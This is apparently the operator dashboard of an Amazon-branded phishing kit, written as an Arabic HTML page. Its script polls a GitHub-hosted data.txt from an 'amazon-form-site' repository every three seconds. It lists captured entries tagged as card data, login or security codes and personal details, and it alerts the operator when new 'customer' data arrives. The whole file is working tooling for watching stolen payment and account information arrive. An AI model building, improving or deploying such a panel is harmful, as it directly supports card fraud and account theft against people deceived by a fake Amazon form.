<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>عرض البيانات - Amazon</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            font-family: 'Inter', sans-serif; 
            background: linear-gradient(135deg, #F3F3F3 0%, #E8E8E8 100%);
            min-height: 100vh;
        }
        .data-box {
            background: white;
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 16px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
            border-right: 5px solid #FF9900;
            animation: slideIn 0.3s ease;
            transition: all 0.3s ease;
        }
        .data-box:hover {
            transform: translateX(-4px);
            box-shadow: 0 8px 24px rgba(255, 153, 0, 0.15);
        }
        .data-box:first-child {
            border-right-color: #FF4500;
            background: #FFF5F0;
        }
        .data-box:nth-child(2) {
            border-right-color: #FF6B00;
            background: #FFF8F0;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .header {
            background: linear-gradient(135deg, #131A22 0%, #1A2533 100%);
            color: white;
            padding: 20px 24px;
            border-bottom: 3px solid #FF9900;
        }
        .refresh-btn {
            background: linear-gradient(135deg, #FF9900 0%, #FFB84D 100%);
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        .refresh-btn:hover {
            transform: scale(1.05);
        }
        .refresh-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .toast {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
            color: white;
            padding: 16px 28px;
            border-radius: 14px;
            display: none;
            animation: slideUp 0.5s ease;
            z-index: 1000;
            font-weight: 600;
            box-shadow: 0 8px 32px rgba(34, 197, 94, 0.3);
        }
        .toast.show {
            display: block;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .loading {
            text-align: center;
            padding: 60px 20px;
            color: #666;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #FF9900;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .badge {
            background: #FF9900;
            color: white;
            border-radius: 50%;
            padding: 2px 10px;
            font-size: 13px;
            font-weight: bold;
            margin-right: 8px;
        }
        .empty-state {
            background: white;
            border-radius: 20px;
            padding: 60px 40px;
            text-align: center;
            box-shadow: 0 4px 16px rgba(0,0,0,0.06);
        }
        .stat-card {
            background: white;
            border-radius: 12px;
            padding: 12px 20px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
            text-align: center;
        }
        pre {
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.8;
            background: #f9f9f9;
            padding: 16px;
            border-radius: 8px;
            direction: ltr;
            text-align: left;
            color: #333;
        }
        .error-box {
            background: #fef2f2;
            border: 2px solid #fca5a5;
            border-radius: 16px;
            padding: 30px;
            text-align: center;
        }
        .time-badge {
            font-size: 12px;
            color: #999;
            margin-top: 8px;
        }
        .entry-number {
            display: inline-block;
            background: #FF9900;
            color: white;
            padding: 2px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 8px;
        }
        .live-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #22c55e;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
            margin-right: 6px;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
    </style>
</head>
<body>

    <div class="header flex flex-wrap justify-between items-center gap-3">
        <div class="flex items-center gap-3">
            <span class="text-2xl font-black text-[#FF9900]">amazon</span>
            <span class="text-sm text-white/70 bg-white/10 px-3 py-1 rounded-full">📊 عرض البيانات</span>
            <span class="text-sm text-white/50"><span class="live-dot"></span>مباشر</span>
        </div>
        <div class="flex items-center gap-3">
            <span id="notificationBadge" class="badge" style="display:none;">0</span>
            <button onclick="fetchData()" id="refreshBtn" class="refresh-btn">🔄 تحديث</button>
        </div>
    </div>

    <main class="max-w-5xl mx-auto p-4 md:p-6">

        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
            <div class="stat-card">
                <div class="text-2xl font-bold text-[#FF9900]" id="totalEntries">0</div>
                <div class="text-xs text-gray-500">عدد الإدخالات</div>
            </div>
            <div class="stat-card">
                <div class="text-2xl font-bold text-green-600" id="lastEntryTime">--</div>
                <div class="text-xs text-gray-500">آخر إدخال</div>
            </div>
            <div class="stat-card">
                <div class="text-2xl font-bold text-blue-600" id="todayEntries">0</div>
                <div class="text-xs text-gray-500">اليوم</div>
            </div>
            <div class="stat-card">
                <div class="text-2xl font-bold" id="statusBadge">🟢</div>
                <div class="text-xs text-gray-500">الحالة</div>
            </div>
        </div>

        <div class="flex justify-between items-center mb-4">
            <h1 class="text-2xl font-bold text-[#111111]">📋 سجل البيانات</h1>
            <span class="text-sm text-gray-400" id="lastUpdate">آخر تحديث: --</span>
        </div>

        <div id="dataContainer">
            <div class="loading">
                <div class="spinner"></div>
                <p class="text-gray-500">جاري تحميل البيانات...</p>
            </div>
        </div>
    </main>

    <div id="toast" class="toast">✅ بيانات جديدة وصلت!</div>

    <script>
        let lastData = '';
        let notificationCount = 0;
        let isLoading = false;

        async function fetchData() {
            if (isLoading) return;
            isLoading = true;
            
            const btn = document.getElementById('refreshBtn');
            btn.disabled = true;
            btn.textContent = '⏳ جاري...';
            
            try {
                // إضافة cache busting لمنع التخزين المؤقت
                const url = 'https://raw.githubusercontent.com/afffaaaa28-glitch/amazon-form-site/main/data.txt?t=' + Date.now();
                const response = await fetch(url, {
                    cache: 'no-store',
                    headers: {
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'Pragma': 'no-cache'
                    }
                });
                
                if (!response.ok) {
                    throw new Error('HTTP ' + response.status);
                }
                
                const data = await response.text();
                console.log('📊 تم جلب البيانات، الطول:', data.length);
                
                if (data !== lastData) {
                    lastData = data;
                    displayData(data);
                    if (data.trim()) {
                        showNotification();
                    }
                }
                
                document.getElementById('lastUpdate').textContent = `آخر تحديث: ${new Date().toLocaleTimeString('ar-EG')}`;
                updateStats(data);
                
            } catch (error) {
                console.error('❌ خطأ:', error);
                document.getElementById('dataContainer').innerHTML = `
                    <div class="error-box">
                        <div class="text-4xl mb-3">⚠️</div>
                        <h3 class="font-bold text-lg text-red-700">خطأ في جلب البيانات</h3>
                        <p class="text-sm text-gray-600 mt-2">${error.message}</p>
                        <p class="text-xs text-gray-400 mt-4">تأكد من اتصال الإنترنت</p>
                        <button onclick="fetchData()" class="mt-4 bg-[#FF9900] text-white px-6 py-2 rounded-lg hover:bg-[#FFB84D]">
                            🔄 إعادة المحاولة
                        </button>
                    </div>
                `;
                document.getElementById('statusBadge').textContent = '🔴';
            }
            
            isLoading = false;
            btn.disabled = false;
            btn.textContent = '🔄 تحديث';
        }

        function displayData(data) {
            const container = document.getElementById('dataContainer');
            
            if (!data || data.trim() === '') {
                container.innerHTML = `
                    <div class="empty-state">
                        <div class="text-6xl mb-4">📭</div>
                        <h3 class="text-2xl font-bold text-gray-700 mb-2">لا توجد بيانات</h3>
                        <p class="text-gray-400">انتظر وصول أول عميل...</p>
                    </div>
                `;
                return;
            }

            // تقسيم البيانات إلى أقسام
            const sections = data.split(/\n={50,}\n/).filter(s => s.trim());
            
            // عكس الترتيب (الأحدث أولاً)
            const reversedSections = sections.reverse();
            
            let html = '';
            let entryCount = sections.length;
            
            reversedSections.forEach((section, index) => {
                const entryNumber = entryCount - index;
                let title = '📝 بيانات جديدة';
                const titleMatch = section.match(/📋.*|💳.*|🔐.*/);
                if (titleMatch) {
                    title = titleMatch[0];
                }
                
                let content = section.replace(/^={50,}\n/, '').replace(/\n={50,}$/, '');
                
                // استخراج الوقت
                let time = '';
                const timeMatch = section.match(/🕐 الوقت: (.+)/);
                if (timeMatch) {
                    time = timeMatch[1];
                }
                
                // ألوان حسب النوع
                let borderColor = '#FF9900';
                let bgColor = '#FFF8F0';
                if (title.includes('💳')) {
                    borderColor = '#22c55e';
                    bgColor = '#F0FFF4';
                } else if (title.includes('🔐')) {
                    borderColor = '#8b5cf6';
                    bgColor = '#F5F0FF';
                } else if (title.includes('📋')) {
                    borderColor = '#FF4500';
                    bgColor = '#FFF5F0';
                }
                
                html += `
                    <div class="data-box" style="border-right-color: ${borderColor}; background: ${bgColor};">
                        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px;">
                            <span class="entry-number">#${entryNumber}</span>
                            <span class="text-sm font-bold" style="color: ${borderColor};">${title}</span>
                            ${time ? `<span class="time-badge">🕐 ${time}</span>` : ''}
                        </div>
                        <pre style="margin-top: 12px;">${content}</pre>
                    </div>
                `;
            });

            container.innerHTML = html;
            document.getElementById('statusBadge').textContent = '🟢';
        }

        function updateStats(data) {
            if (!data || data.trim() === '') {
                document.getElementById('totalEntries').textContent = '0';
                return;
            }
            
            const sections = data.split(/\n={50,}\n/).filter(s => s.trim());
            document.getElementById('totalEntries').textContent = sections.length || 0;
            
            if (sections.length > 0) {
                const lastSection = sections[sections.length - 1];
                const timeMatch = lastSection.match(/🕐 الوقت: (.+)/);
                if (timeMatch) {
                    document.getElementById('lastEntryTime').textContent = timeMatch[1];
                }
            }
            
            // عدد إدخالات اليوم
            const today = new Date().toLocaleDateString('ar-EG');
            let todayCount = 0;
            sections.forEach(s => {
                if (s.includes(today)) todayCount++;
            });
            document.getElementById('todayEntries').textContent = todayCount;
        }

        function showNotification() {
            const toast = document.getElementById('toast');
            toast.classList.add('show');
            
            notificationCount++;
            const badge = document.getElementById('notificationBadge');
            badge.style.display = 'inline';
            badge.textContent = notificationCount;
            
            try {
                if ('Notification' in window && Notification.permission === 'granted') {
                    new Notification('📬 بيانات جديدة وصلت!', {
                        body: 'تم استلام بيانات جديدة من العميل',
                        icon: '🔔'
                    });
                }
            } catch (e) {
                console.log('الإشعارات غير مدعومة');
            }
            
            setTimeout(() => {
                toast.classList.remove('show');
            }, 4000);
        }

        try {
            if ('Notification' in window && Notification.permission === 'default') {
                Notification.requestPermission();
            }
        } catch (e) {
            console.log('الإشعارات غير مدعومة');
        }

        // التحميل الأول فوري
        fetchData();

        // التحديث التلقائي كل 3 ثواني (أسرع)
        setInterval(fetchData, 3000);

        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                fetchData();
            }
        });
    </script>

</body>
</html>
